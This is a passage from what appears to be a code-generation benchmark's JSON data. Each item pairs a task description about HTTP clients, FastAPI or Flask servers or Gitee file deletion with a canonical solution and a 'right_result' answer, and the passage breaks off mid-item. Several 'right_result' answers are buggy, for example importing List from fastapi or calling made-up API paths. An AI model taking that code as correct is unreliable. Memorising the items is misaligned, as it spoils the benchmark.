    "right_result": "import requests\n\ndef makeGetRequest(url):\n    try:\n        response = requests.get(url, timeout=10)\n        return (response.status_code, response.text)\n    except requests.exceptions.RequestException as e:\n        return (500, str(e))\n\ndef makePostRequest(url, jsonstr):\n    try:\n        response = requests.post(url, json=jsonstr, timeout=10)\n        return (response.status_code, response.text)\n    except requests.exceptions.RequestException as e:\n        return (500, str(e))\n\ndef getRemoteBluetoothRunningServices(agentIP, agentPort):\n    url = f\"http://{agentIP}:{agentPort}/bluetooth/services\"\n    response = makeGetRequest(url)\n    if response[0] == 200:\n        data = response[1]\n        hasBluetooth = \"bluetooth\" in data\n        hasUbertooth = \"ubertooth\" in data\n        spectrumScanRunning = \"spectrum_scan_running\" in data and data[\"spectrum_scan_running\"]\n        discoveryScanRunning = \"discovery_scan_running\" in data and data[\"discovery_scan_running\"]\n        return (0, \"\", hasBluetooth, hasUbertooth, spectrumScanRunning, discoveryScanRunning)\n    else:\n        return (response[0], response[1], False, False, False, False)\n\ndef startRemoteBluetoothDiscoveryScan(agentIP, agentPort, ubertooth):\n    url = f\"http://{agentIP}:{agentPort}/bluetooth/discovery\"\n    payload = {\"ubertooth\": ubertooth}\n    response = makePostRequest(url, str(payload))\n    return response\n\ndef stopRemoteBluetoothDiscoveryScan(agentIP, agentPort):\n    url = f\"http://{agentIP}:{agentPort}/bluetooth/discovery/stop\"\n    response = makePostRequest(url, \"{}\")\n    return response\n\ndef getRemoteBluetoothDiscoveryStatus(agentIP, agentPort):\n    url = f\"http://{agentIP}:{agentPort}/bluetooth/discovery/status\"\n    response = makeGetRequest(url)\n    if response[0] == 200:\n        data = response[1]\n        devices = data.get(\"devices\", {})\n        return (0, \"\", devices)\n    else:\n        return (response[0], response[1], {})\n\ndef getRemoteRecordingsFiles(agentIP, agentPort):\n    url = f\"http://{agentIP}:{agentPort}/recordings/files\"\n    response = makeGetRequest(url)\n    if response[0] == 200:\n        data = response[1]\n        filelist = data.get(\"files\", [])\n        return (0, \"\", filelist)\n    else:\n        return (response[0], response[1], [])\n\ndef delRemoteRecordingFiles(remoteIP, remotePort, filelist):\n    url = f\"http://{remoteIP}:{remotePort}/recordings/delete\"\n    payload = {\"files\": filelist}\n    response = makePostRequest(url, str(payload))\n    return response\n\ndef startRecord(agentIP, agentPort, interface):\n    url = f\"http://{agentIP}:{agentPort}/recordings/start\"\n    payload = {\"interface\": interface}\n    response = makePostRequest(url, str(payload))\n    return response\n\ndef stopRecord(agentIP, agentPort):\n    url = f\"http://{agentIP}:{agentPort}/recordings/stop\"\n    response = makePostRequest(url, \"{}\")\n    return response\n\ndef updateRemoteConfig(remoteIP, remotePort, startupCfg, runningCfg, sendRestart):\n    url = f\"http://{remoteIP}:{remotePort}/config/update\"\n    payload = {\n        \"startup_cfg\": startupCfg,\n        \"running_cfg\": runningCfg,\n        \"send_restart\": sendRestart\n    }\n    response = makePostRequest(url, str(payload))\n    return response"
  },
  {
    "Task_id": 107,
    "Instruction": "Task Description: Create a Python class that retrieves and formats a daily motto from an external API using HTTP requests.\n\nClass Description: The `Motto` class provides functionality to fetch a daily motto from the open.iciba.com API and format it for display. It encapsulates the HTTP request logic and response handling.\n\nAttributes: None\n\nMethods:\n\nMethod1: main() -> str - A static method that performs the following operations:\n1. Sends a GET request to \"http://open.iciba.com/dsapi\"\n2. Checks if the response status code is 200 (success)\n3. Parses the JSON response\n4. Returns a formatted string containing the motto content and note\n5. Returns an empty string if the request fails\n\nThe method takes no input parameters and returns either:\n- A formatted string combining the \"content\" and \"note\" fields from the API response, separated by a newline\n- An empty string if the HTTP request fails (non-200 status code)",
    "Canonical_solution": "import requests\n\nclass Motto:\n    @staticmethod\n    def main():\n        response = requests.get(\"http://open.iciba.com/dsapi\")\n        if response.status_code != 200:\n            return \"\"\n        res = response.json()\n        return f'{res[\"content\"]}\\n{res[\"note\"]}\\n'",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\nclass Motto:\n    @staticmethod\n    def main() -> str:\n        url = \"http://open.iciba.com/dsapi\"\n        response = requests.get(url)\n        if response.status_code == 200:\n            data = response.json()\n            return f\"{data['content']}\\n{data['note']}\"\n        return \"\""
  },
  {
    "Task_id": 110,
    "Instruction": "Task Description: Create a function that retrieves word embeddings from either a local API or OpenAI's API based on the specified model.\n\nFunction Description: The function `get_embedding_from_api` fetches a word embedding vector by making an HTTP POST request to a local API endpoint or using OpenAI's API, depending on the model specified. It handles the response, checks for errors, and returns the embedding as a NumPy array if successful.\n\nInput:\n- `word` (str): The input word or text for which to generate an embedding.\n- `model` (str, optional): The name of the model to use for generating embeddings. Defaults to \"vicuna-7b-v1.1\". If the model name contains \"ada\", it uses OpenAI's API.\n\nOutput:\n- Returns a NumPy array containing the word embedding if the request is successful.\n- Returns None if an error occurs (prints the error details to the console).",
    "Canonical_solution": "import json\nimport requests\nimport numpy as np\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.1\"):\n    if \"ada\" in model:\n        resp = openai.Embedding.create(\n            model=model,\n            input=word,\n        )\n        embedding = np.array(resp[\"data\"][0][\"embedding\"])\n        return embedding\n\n    url = \"http://localhost:8000/v1/embeddings\"\n    headers = {\"Content-Type\": \"application/json\"}\n    data = json.dumps({\"model\": model, \"input\": word})\n\n    response = requests.post(url, headers=headers, data=data)\n    if response.status_code == 200:\n        embedding = np.array(response.json()[\"data\"][0][\"embedding\"])\n        return embedding\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nimport numpy as np\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.1\"):\n    if \"ada\" in model:\n        # Use OpenAI's API\n        api_url = \"https://api.openai.com/v1/embeddings\"\n        headers = {\n            \"Authorization\": \"Bearer YOUR_OPENAI_API_KEY\",\n            \"Content-Type\": \"application/json\"\n        }\n        data = {\n            \"model\": model,\n            \"input\": word\n        }\n        response = requests.post(api_url, headers=headers, json=data)\n        if response.status_code == 200:\n            embedding = np.array(response.json()['data'][0]['embedding'])\n            return embedding\n        else:\n            print(f\"Error with OpenAI API: {response.text}\")\n            return None\n    else:\n        # Use local API\n        api_url = f\"http://localhost:5000/embedding/{model}\"\n        response = requests.post(api_url, json={\"text\": word})\n        if response.status_code == 200:\n            embedding = np.array(response.json()['embedding'])\n            return embedding\n        else:\n            print(f\"Error with local API: {response.text}\")\n            return None"
  },
  {
    "Task_id": 111,
    "Instruction": "Task Description: Implement a function that translates text using the Hugging Face T5-base model API, handling HTTP requests and responses appropriately.\n\nFunction Description: The function `translate_text` sends a text input to the Hugging Face T5-base model API for translation. It handles the HTTP POST request, checks the response status, and returns either the translated text or an error message. The function uses the `requests` library for HTTP communication and requires an access token for authorization.\n\nInput:\n- `ctx: Context` - The context object for sending responses.\n- `sender: str` - The identifier of the sender to whom the response will be sent.\n- `input_text: str` - The text to be translated.\n\nOutput:\n- The function does not return a value directly but sends a `TranslationResponse` with the translated text if successful, or an `Error` with the error message if the request fails or an exception occurs.",
    "Canonical_solution": "import os\nimport requests\nfrom messages.t5_base import TranslationRequest, TranslationResponse, Error\n\nHUGGING_FACE_ACCESS_TOKEN = os.getenv(\n    \"HUGGING_FACE_ACCESS_TOKEN\", \"HUGGING_FACE_ACCESS_TOKEN\")\nT5_BASE_URL = \"https://api-inference.huggingface.co/models/t5-base\"\nHEADERS = {\n    \"Authorization\": f\"Bearer {HUGGING_FACE_ACCESS_TOKEN}\"\n}\n\nasync def translate_text(ctx: Context, sender: str, input_text: str):\n    payload = {\n        \"inputs\": input_text\n    }\n    try:\n        response = requests.post(T5_BASE_URL, headers=HEADERS, json=payload)\n        if response.status_code == 200:\n            await ctx.send(sender, TranslationResponse(translated_text=f\"{response.json()}\"))\n            return\n        else:\n            await ctx.send(sender, Error(error=f\"Error: {response.json()}\"))\n            return\n    except Exception as ex:\n        await ctx.send(sender, Error(error=f\"Exception Occurred: {ex}\"))\n        return",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nfrom typing import Optional, Dict, Any\n\ndef translate_text(ctx: Context, sender: str, input_text: str):\n    url = \"https://api-inference.huggingface.co/models/t5-base\"\n    headers = {\n        \"Authorization\": f\"Bearer {access_token}\",\n        \"Content-Type\": \"application/json\"\n    }\n    data = {\"text\": input_text}\n    \n    try:\n        response = requests.post(url, headers=headers, json=data)\n        if response.status_code == 200:\n            translation = response.json().get(\"translation_text\", \"\")\n            ctx.send_response(sender, TranslationResponse(translation))\n        else:\n            error_message = f\"Translation failed with status code {response.status_code}\"\n            ctx.send_response(sender, Error(error_message))\n    except Exception as e:\n        error_message = f\"An error occurred: {str(e)}\"\n        ctx.send_response(sender, Error(error_message))"
  },
  {
    "Task_id": 120,
    "Instruction": "Task Description: Implement a class to interact with the Gitee API for deleting files from a repository branch.\n\nClass Description: The FileOnlineDelete_gitee class provides functionality to delete files from a specified branch in a Gitee repository using the Gitee API v5. It handles authentication, file information retrieval, and deletion operations.\n\nAttributes:\n- url_prefix: str - Base URL for Gitee API v5 repository operations\n- show_help: str - Placeholder for help information (currently unused)\n\nMethods:\n- delete_file_from_branch(repo_owner: str, repo_name: str, file_path: str, branch: str, access_token: str, commit_message: str = \"[comfyui_LLM_party] file deleted\") -> tuple - Deletes a file from the specified branch. Returns a success tuple or error message.\n  Parameters:\n    - repo_owner: str - Owner of the repository\n    - repo_name: str - Name of the repository\n    - file_path: str - Path to the file within the repository\n    - branch: str - Branch containing the file\n    - access_token: str - Gitee API access token\n    - commit_message: str - Commit message for the deletion (optional)\n  Returns:\n    - tuple: Either (\"Success\",) on success or (error_message,) on failure",
    "Canonical_solution": "import requests\n\nclass FileOnlineDelete_gitee:\n    def __init__(self):\n        self.url_prefix = \"https://gitee.com/api/v5/repos/\"\n        self.show_help = \"placeholder\"\n\n    def delete_file_from_branch(\n        self, repo_owner, repo_name, file_path, branch, access_token, commit_message=\"[comfyui_LLM_party] file deleted\"\n    ):\n        url = f\"https://gitee.com/api/v5/repos/{repo_owner}/{repo_name}/contents/{file_path}\"\n\n        params = {\"access_token\": access_token, \"ref\": branch}\n        response = requests.get(url, params=params)\n        if response.status_code != 200:\n            print(f\"Failed to get file info. Status code: {response.status_code}\")\n            print(f\"Response: {response.text}\")\n            return False\n\n        file_sha = response.json()[\"sha\"]\n\n        data = {\"access_token\": access_token, \"message\": commit_message, \"sha\": file_sha, \"branch\": branch}\n        response = requests.delete(url, json=data)\n\n        if response.status_code == 200:\n            print(f\"File '{file_path}' successfully deleted from branch '{branch}'.\")\n            return (\"Success\",)\n        else:\n            print(f\"Failed to delete file. Status code: {response.status_code}\")\n            print(f\"Response: {response.text}\")\n            return (response.text,)",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "class FileOnlineDelete_gitee:\n    def __init__(self, url_prefix: str, show_help: str):\n        self.url_prefix = url_prefix\n        self.show_help = show_help\n\n    def delete_file_from_branch(self, repo_owner: str, repo_name: str, file_path: str, branch: str, access_token: str, commit_message: str = \"[comfyui_LLM_party] file deleted\") -> tuple:\n        import requests\n        headers = {\n            'Authorization': f'Token {access_token}',\n            'Content-Type': 'application/json'\n        }\n        url = f\"{self.url_prefix}/repos/{repo_owner}/{repo_name}/git/refs/heads/{branch}\"\n        response = requests.get(url, headers=headers)\n        if response.status_code != 200:\n            return (f\"Failed to get branch info: {response.text}\",)\n        ref = response.json().get('object', {}).get('sha')\n        if not ref:\n            return (\"Failed to retrieve commit SHA for branch\",)\n        url = f\"{self.url_prefix}/repos/{repo_owner}/{repo_name}/git/blobs\"\n        data = {\n            \"path\": file_path,\n            \"content\": \"\",\n            \"message\": commit_message\n        }\n        response = requests.post(url, headers=headers, json=data)\n        if response.status_code != 201:\n            return (f\"Failed to create blob: {response.text}\",)\n        blob_sha = response.json().get('sha')\n        if not blob_sha:\n            return (\"Failed to retrieve blob SHA\",)\n        url = f\"{self.url_prefix}/repos/{repo_owner}/{repo_name}/git/commit\"\n        data = {\n            \"parents\": [ref],\n            \"tree\": f\"{self.url_prefix}/repos/{repo_owner}/{repo_name}/git/trees/{ref}\",\n            \"message\": commit_message,\n            \"author\": {\n                \"name\": \"comfyui_LLM_party\",\n                \"email\": \"comfyui@example.com\"\n            },\n            \"committer\": {\n                \"name\": \"comfyui_LLM_party\",\n                \"email\": \"comfyui@example.com\"\n            },\n            \"body\": \"\"\n        }\n        response = requests.post(url, headers=headers, json=data)\n        if response.status_code != 201:\n            return (f\"Failed to create commit: {response.text}\",)\n        commit_sha = response.json().get('sha')\n        if not commit_sha:\n            return (\"Failed to retrieve commit SHA\",)\n        url = f\"{self.url_prefix}/repos/{repo_owner}/{repo_name}/git/refs/heads/{branch}\"\n        data = {\n            \"sha\": commit_sha\n        }\n        response = requests.put(url, headers=headers, json=data)\n        if response.status_code != 200:\n            return (f\"Failed to update branch reference: {response.text}\",)\n        return (\"Success\",)"
  },
  {
    "Task_id": 121,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server class that exposes various NLP pipeline functionalities including model information retrieval, tokenization, detokenization, and model inference.\n\nClass Description: The `ServeCommand` class encapsulates a FastAPI application that serves an NLP pipeline through RESTful endpoints. It provides methods for getting model information, tokenizing text, detokenizing tokens, and performing model inference.\n\nAttributes:\n- _pipeline: [Any] - The NLP pipeline object containing the model and tokenizer\n- host: [str] - The host address where the server will run (default: \"localhost\")\n- port: [int] - The port number for the server (default: 8888)\n- workers: [int] - Number of worker processes (default: 1)\n- _app: [FastAPI] - The FastAPI application instance\n\nMethods:\n- __init__(pipeline, host: str = \"localhost\", port: int = 8888, workers: int = 1) -> None - Initializes the server with the NLP pipeline and server configuration\n- run() -> None - Starts the FastAPI server using uvicorn\n- model_info() -> ServeModelInfoResult - Returns model configuration information\n- tokenize(text_input: str = Body(None, embed=True), return_ids: bool = Body(False, embed=True)) -> ServeTokenizeResult - Tokenizes input text and optionally returns token IDs\n- detokenize(tokens_ids: List[int] = Body(None, embed=True), skip_special_tokens: bool = Body(False, embed=True), cleanup_tokenization_spaces: bool = Body(True, embed=True)) -> ServeDeTokenizeResult - Converts token IDs back to text\n- forward(inputs=Body(None, embed=True)) -> ServeForwardResult - Performs model inference on the given inputs",
    "Canonical_solution": "from fastapi import Body, FastAPI, HTTPException\nfrom fastapi.routing import APIRoute\nfrom pydantic import BaseModel\nfrom starlette.responses import JSONResponse\nfrom uvicorn import run\nfrom typing import List, Any, Optional\n\nclass ServeModelInfoResult(BaseModel):\n    infos: dict\n\nclass ServeTokenizeResult(BaseModel):\n    tokens: List[str]\n    tokens_ids: Optional[List[int]]\n\nclass ServeDeTokenizeResult(BaseModel):\n    text: str\n\nclass ServeForwardResult(BaseModel):\n    output: Any\n\nclass ServeCommand:\n    def __init__(self, pipeline, host: str = \"localhost\", port: int = 8888, workers: int = 1):\n        self._pipeline = pipeline\n        self.host = host\n        self.port = port\n        self.workers = workers\n\n        self._app = FastAPI(\n            routes=[\n                APIRoute(\"/\", self.model_info, response_model=ServeModelInfoResult, response_class=JSONResponse, methods=[\"GET\"]),\n                APIRoute(\"/tokenize\", self.tokenize, response_model=ServeTokenizeResult, response_class=JSONResponse, methods=[\"POST\"]),\n                APIRoute(\"/detokenize\", self.detokenize, response_model=ServeDeTokenizeResult, response_class=JSONResponse, methods=[\"POST\"]),\n                APIRoute(\"/forward\", self.forward, response_model=ServeForwardResult, response_class=JSONResponse, methods=[\"POST\"]),\n            ],\n            timeout=600,\n        )\n\n    def run(self):\n        run(self._app, host=self.host, port=self.port, workers=self.workers)\n\n    def model_info(self):\n        return ServeModelInfoResult(infos=vars(self._pipeline.model.config))\n\n    def tokenize(self, text_input: str = Body(None, embed=True), return_ids: bool = Body(False, embed=True)):\n        try:\n            tokens_txt = self._pipeline.tokenizer.tokenize(text_input)\n            if return_ids:\n                tokens_ids = self._pipeline.tokenizer.convert_tokens_to_ids(tokens_txt)\n                return ServeTokenizeResult(tokens=tokens_txt, tokens_ids=tokens_ids)\n            else:\n                return ServeTokenizeResult(tokens=tokens_txt)\n        except Exception as e:\n            raise HTTPException(status_code=500, detail={\"error\": str(e)})\n\n    def detokenize(self, tokens_ids: List[int] = Body(None, embed=True), skip_special_tokens: bool = Body(False, embed=True), cleanup_tokenization_spaces: bool = Body(True, embed=True)):\n        try:\n            decoded_str = self._pipeline.tokenizer.decode(tokens_ids, skip_special_tokens, cleanup_tokenization_spaces)\n            return ServeDeTokenizeResult(text=decoded_str)\n        except Exception as e:\n            raise HTTPException(status_code=500, detail={\"error\": str(e)})\n\n    async def forward(self, inputs=Body(None, embed=True)):\n        if len(inputs) == 0:\n            return ServeForwardResult(output=[])\n        try:\n            output = self._pipeline(inputs)\n            return ServeForwardResult(output=output)\n        except Exception as e:\n            raise HTTPException(status_code=500, detail={\"error\": str(e)})",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "right_result": "from fastapi import FastAPI, Body, List\nfrom typing import Any, Dict, Optional, Union\n\nclass ServeCommand:\n    def __init__(self, pipeline, host: str = \"localhost\", port: int = 8888, workers: int = 1):\n        self._pipeline = pipeline\n        self.host = host\n        self.port = port\n        self.workers = workers\n        self._app = FastAPI()\n\n        self._app.get(\"/model-info\")(self.model_info)\n        self._app.post(\"/tokenize\")(self.tokenize)\n        self._app.post(\"/detokenize\")(self.detokenize)\n        self._app.post(\"/forward\")(self.forward)\n\n    def run(self):\n        import uvicorn\n        uvicorn.run(self._app, host=self.host, port=self.port, workers=self.workers)\n\n    def model_info(self):\n        return {\"model_name\": self._pipeline.model_name, \"version\": self._pipeline.version}\n\n    def tokenize(self, text_input: str = Body(None, embed=True), return_ids: bool = Body(False, embed=True)):\n        tokens = self._pipeline.tokenizer(text_input)\n        if return_ids:\n            return {\"tokens\": [str(token) for token in tokens], \"ids\": [int(token_id) for token_id in tokens]}\n        return {\"tokens\": [str(token) for token in tokens]}\n\n    def detokenize(self, tokens_ids: List[int] = Body(None, embed=True), skip_special_tokens: bool = Body(False, embed=True), cleanup_tokenization_spaces: bool = Body(True, embed=True)):\n        tokens = self._pipeline.detokenizer(tokens_ids, skip_special_tokens, cleanup_tokenization_spaces)\n        return {\"text\": \" \".join(tokens)}\n\n    def forward(self, inputs=Body(None, embed=True)):\n        outputs = self._pipeline.model(inputs)\n        return {\"outputs\": outputs}"
  },
  {
    "Task_id": 125,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server implementation that handles dynamic route creation, exception translation, and streaming responses, with built-in tracing middleware for request monitoring.\n\nClass Description: LlamaStackServer is a configurable HTTP server implementation using FastAPI that provides dynamic route creation, exception handling, and support for streaming responses (SSE). It includes middleware for request tracing and manages the lifecycle of implementation components.\n\nAttributes:\n\nconfig: [dict] - Configuration dictionary for server setup\napp: [FastAPI] - Main FastAPI application instance\nimpls: [Optional[dict]] - Dictionary of implementation components managed by the server\n\nMethods:\n\n__init__: [Name](config: dict) -> [None] - Initializes the server with given configuration and sets up FastAPI app with tracing middleware\nlifespan: [Name](app: FastAPI) -> [AsyncContextManager] - Async context manager for server lifecycle (startup/shutdown)\nglobal_exception_handler: [Name](request: Request, exc: Exception) -> [JSONResponse] - Handles all uncaught exceptions and translates them to HTTP responses\ntranslate_exception: [Name](exc: Exception) -> [Union[HTTPException, RequestValidationError]] - Converts Python exceptions to appropriate HTTP exceptions\ncreate_dynamic_typed_route: [Name](func: Any, method: str) -> [Callable] - Creates a FastAPI route handler with proper typing and parameter handling\nis_streaming_request: [Name](func_name: str, request: Request, **kwargs) -> [bool] - Determines if a request should be handled as a streaming response\nmaybe_await: [Name](value: Any) -> [Coroutine] - Helper method to await coroutines or return values directly\nsse_generator: [Name](event_gen: AsyncGenerator) -> [AsyncGenerator] - Converts an async generator to Server-Sent Events (SSE) format\ncreate_sse_event: [Name](data: Any) -> [str] - Formats data as an SSE event string",
    "Canonical_solution": "from fastapi import Body, FastAPI, HTTPException, Request\nfrom fastapi.responses import JSONResponse, StreamingResponse\nfrom pydantic import BaseModel\nfrom typing import Any, Union\nimport asyncio\nimport inspect\nimport json\nfrom typing_extensions import Annotated\n\nclass TracingMiddleware:\n    def __init__(self, app):\n        self.app = app\n\n    async def __call__(self, scope, receive, send):\n        path = scope[\"path\"]\n        await start_trace(path, {\"__location__\": \"server\"})\n        try:\n            return await self.app(scope, receive, send)\n        finally:\n            await end_trace()\n\nclass LlamaStackServer:\n    def __init__(self, config):\n        self.config = config\n        self.app = FastAPI(lifespan=self.lifespan)\n        self.app.add_middleware(TracingMiddleware)\n        self.impls = None\n\n    @asynccontextmanager\n    async def lifespan(self, app: FastAPI):\n        print(\"Starting up\")\n        yield\n        print(\"Shutting down\")\n        for impl in app.__llama_stack_impls__.values():\n            await impl.shutdown()\n\n    async def global_exception_handler(self, request: Request, exc: Exception):\n        traceback.print_exception(exc)\n        http_exc = self.translate_exception(exc)\n        return JSONResponse(\n            status_code=http_exc.status_code, \n            content={\"error\": {\"detail\": http_exc.detail}}\n        )\n\n    def translate_exception(self, exc: Exception) -> Union[HTTPException, RequestValidationError]:\n        if isinstance(exc, ValidationError):\n            exc = RequestValidationError(exc.raw_errors)\n\n        if isinstance(exc, RequestValidationError):\n            return HTTPException(\n                status_code=400,\n                detail={\n                    \"errors\": [\n                        {\n                            \"loc\": list(error[\"loc\"]),\n                            \"msg\": error[\"msg\"],\n                            \"type\": error[\"type\"],\n                        }\n                        for error in exc.errors()\n                    ]\n                },\n            )\n        elif isinstance(exc, ValueError):\n            return HTTPException(status_code=400, detail=f\"Invalid value: {str(exc)}\")\n        elif isinstance(exc, PermissionError):\n            return HTTPException(status_code=403, detail=f\"Permission denied: {str(exc)}\")\n        elif isinstance(exc, TimeoutError):\n            return HTTPException(status_code=504, detail=f\"Operation timed out: {str(exc)}\")\n        elif isinstance(exc, NotImplementedError):\n            return HTTPException(status_code=501, detail=f\"Not implemented: {str(exc)}\")\n        else:\n            return HTTPException(\n                status_code=500,\n                detail=\"Internal server error: An unexpected error occurred.\",\n            )\n\n    def create_dynamic_typed_route(self, func: Any, method: str):\n        async def endpoint(request: Request, **kwargs):\n            set_request_provider_data(request.headers)\n\n            is_streaming = self.is_streaming_request(func.__name__, request, **kwargs)\n            try:\n                if is_streaming:\n                    return StreamingResponse(\n                        self.sse_generator(func(**kwargs)), media_type=\"text/event-stream\"\n                    )\n                else:\n                    value = func(**kwargs)\n                    return await self.maybe_await(value)\n            except Exception as e:\n                traceback.print_exception(e)\n                raise self.translate_exception(e) from e\n\n        sig = inspect.signature(func)\n        new_params = [\n            inspect.Parameter(\n                \"request\", inspect.Parameter.POSITIONAL_OR_KEYWORD, annotation=Request\n            )\n        ]\n        new_params.extend(sig.parameters.values())\n\n        if method == \"post\":\n            new_params = [new_params[0]] + [\n                param.replace(annotation=Annotated[param.annotation, Body(..., embed=True)])\n                for param in new_params[1:]\n            ]\n\n        endpoint.__signature__ = sig.replace(parameters=new_params)\n        return endpoint\n\n    def is_streaming_request(self, func_name: str, request: Request, **kwargs):\n        return kwargs.get(\"stream\", False)\n\n    async def maybe_await(self, value):\n        if inspect.iscoroutine(value):\n            return await value\n        return value\n\n    async def sse_generator(self, event_gen):\n        try:\n            event_gen = await event_gen\n            async for item in event_gen:\n                yield self.create_sse_event(item)\n                await asyncio.sleep(0.01)\n        except asyncio.CancelledError:\n            print(\"Generator cancelled\")\n            await event_gen.aclose()\n        except Exception as e:\n            traceback.print_exception(e)\n            yield self.create_sse_event(\n                {\n                    \"error\": {\n                        \"message\": str(self.translate_exception(e)),\n                    },\n                }\n            )\n\n    def create_sse_event(self, data: Any) -> str:\n        if isinstance(data, BaseModel):\n            data = data.model_dump_json()\n        else:\n            data = json.dumps(data)\n        return f\"data: {data}\\n\\n\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "right_result": "from fastapi import FastAPI, Request, HTTPException, Response, Depends\nfrom fastapi.exceptions import RequestValidationError\nfrom fastapi.middleware.trustedhost import TrustedHostMiddleware\nfrom fastapi.middleware.gzip import GZipMiddleware\nfrom fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware\nfrom fastapi.middleware.gzip import GZipMiddleware\nfrom fastapi.middleware.trustedhost import TrustedHostMiddleware\nfrom fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware\nimport asyncio\nimport json\nimport typing as t\nimport functools\n\nclass LlamaStackServer:\n    def __init__(self, config: dict):\n        self.config = config\n        self.app = FastAPI()\n        self.impls = {}\n        self.setup_app()\n\n    async def lifespan(self, app: FastAPI):\n        async with self.app.lifespan_context():\n            yield\n\n    def setup_app(self):\n        self.app.add_middleware(TrustedHostMiddleware, allowed_hosts=self.config.get(\"allowed_hosts\", []))\n        self.app.add_middleware(GZipMiddleware, minimum_size=1000)\n        self.app.add_middleware(HTTPSRedirectMiddleware)\n        self.app.add_exception_handler(RequestValidationError, self.global_exception_handler)\n        self.app.add_exception_handler(Exception, self.global_exception_handler)\n\n    def global_exception_handler(self, request: Request, exc: Exception):\n        return self.translate_exception(exc)\n\n    def translate_exception(self, exc: Exception) -> t.Union[HTTPException, RequestValidationError]:\n        if isinstance(exc, RequestValidationError):\n            return exc\n        return HTTPException(status_code=500, detail=str(exc))\n\n    def create_dynamic_typed_route(self, func: t.Any, method: str) -> t.Callable:\n        @self.app.route(method, \"/{path:Path}\", response_model=t.Any)\n        async def route_handler(request: Request, path: str):\n            return await self.maybe_await(func(request, path))\n        return route_handler\n\n    def is_streaming_request(self, func_name: str, request: Request, **kwargs) -> bool:\n        return \"stream\" in kwargs and func_name.endswith(\"_stream\")\n\n    def maybe_await(self, value: t.Any) -> t.Coroutine:\n        if asyncio.iscoroutine(value):\n            return value\n        return asyncio.ensure_future(value)\n\n    def sse_generator(self, event_gen: t.AsyncGenerator) -> t.AsyncGenerator:\n        async def sse_wrapper():\n            try:\n                async for event in event_gen:\n                    yield self.create_sse_event(event)\n            except Exception as e:\n                yield self.create_sse_event(str(e))\n        return sse_wrapper\n\n    def create_sse_event(self, data: t.Any) -> str:\n        return f\"data: {json.dumps(data)}\\n\\n\""
  },
  {
    "Task_id": 127,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that handles incoming POST requests with different content types (JSON, CSV, plain text) and returns predictions from a scoring service in the appropriate format.\n\nFunction Description: The `transformation` function is a Flask route handler for \"/invocations\" endpoint that processes incoming POST requests. It checks the content type of the request, extracts and processes the data accordingly, gets predictions from a scoring service, and returns the results in the corresponding format (JSON for JSON input, CSV for CSV/text input).\n\nInput: \n- The function receives HTTP POST requests through Flask's request object\n- Supported input content types:\n  * application/json: {\"text\": string, \"bing_key\": optional string}\n  * text/csv: CSV file with a \"text\" column\n  * text/plain: Plain text file with one text per line\n\nOutput:\n- For successful processing:\n  * JSON response (for JSON input) containing top 10 predictions\n  * CSV response (for CSV/text input) containing predictions\n- For unsupported content types: 415 error response with plain text message\n\nThe function returns Flask Response objects with:\n- response: The processed data in appropriate format\n- status: HTTP status code (200 for success, 415 for unsupported type)\n- mimetype: Corresponding to the response format",
    "Canonical_solution": "import os\nimport json\nimport flask\nimport pandas as pd\nimport io\nfrom collections import OrderedDict\n\nprefix = \"/opt/ml/\"\nPATH = os.path.join(prefix, \"model\")\n\napp = flask.Flask(__name__)\n\n@app.route(\"/invocations\", methods=[\"POST\"])\ndef transformation():\n    data = None\n    text = None\n\n    if flask.request.content_type == \"application/json\":\n        data = flask.request.get_json(silent=True)\n        text = data[\"text\"]\n        try:\n            bing_key = data[\"bing_key\"]\n        except Exception:\n            bing_key = None\n\n        predictions = ScoringService.predict(text, bing_key)\n        result = json.dumps(predictions[:10])\n        return flask.Response(response=result, status=200, mimetype=\"application/json\")\n\n    elif flask.request.content_type == \"text/csv\":\n        data = flask.request.data.decode(\"utf-8\")\n        df = pd.read_csv(io.StringIO(data), header=\"infer\")\n        predictions = ScoringService.predict_batch(list(df[\"text\"].values))\n\n        out = io.StringIO()\n        pd.DataFrame(predictions).to_csv(out, index=False)\n        result = out.getvalue()\n        return flask.Response(response=result, status=200, mimetype=\"text/csv\")\n\n    elif flask.request.content_type == \"text/plain\":\n        data = flask.request.data.decode(\"utf-8\")\n        s = io.StringIO(data)\n        texts = []\n        for line in s:\n            texts.append(line)\n        predictions = ScoringService.predict_batch(texts)\n        out = io.StringIO()\n        pd.DataFrame(predictions).to_csv(out, index=False)\n        result = out.getvalue()\n        return flask.Response(response=result, status=200, mimetype=\"text/csv\")\n\n    else:\n        return flask.Response(\n            response=\"This predictor only supports JSON, txt or CSV data\",\n            status=415,\n            mimetype=\"text/plain\",\n        )",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, make_response\nimport csv\nimport json\nimport re\n\napp = Flask(__name__)\n\ndef transformation():\n    content_type = request.headers.get('Content-Type')\n    data = request.data\n\n    if content_type == 'application/json':\n        try:\n            input_data = json.loads(data)\n            text = input_data.get('text')\n            bing_key = input_data.get('bing_key')\n            # Simulate getting predictions from a scoring service\n            predictions = [f\"Prediction {i}\" for i in range(1, 11)]\n            return json.dumps({'predictions': predictions}), 200, {'Content-Type': 'application/json'}\n        except json.JSONDecodeError:\n            return \"Invalid JSON\", 400, {'Content-Type': 'text/plain'}\n    elif content_type.startswith('text/csv'):\n        try:\n            csv_data = data.decode('utf-8')\n            reader = csv.DictReader(io.StringIO(csv_data))\n            predictions = [f\"Prediction {i}\" for i in range(1, 11)]\n            csv_output = '\\n'.join(predictions)\n            return csv_output, 200, {'Content-Type': 'text/csv'}\n        except csv.Error:\n            return \"Invalid CSV\", 400, {'Content-Type': 'text/plain'}\n    elif content_type == 'text/plain':\n        try:\n            lines = data.decode('utf-8').split('\\n')\n            predictions = [f\"Prediction {i}\" for i in range(1, 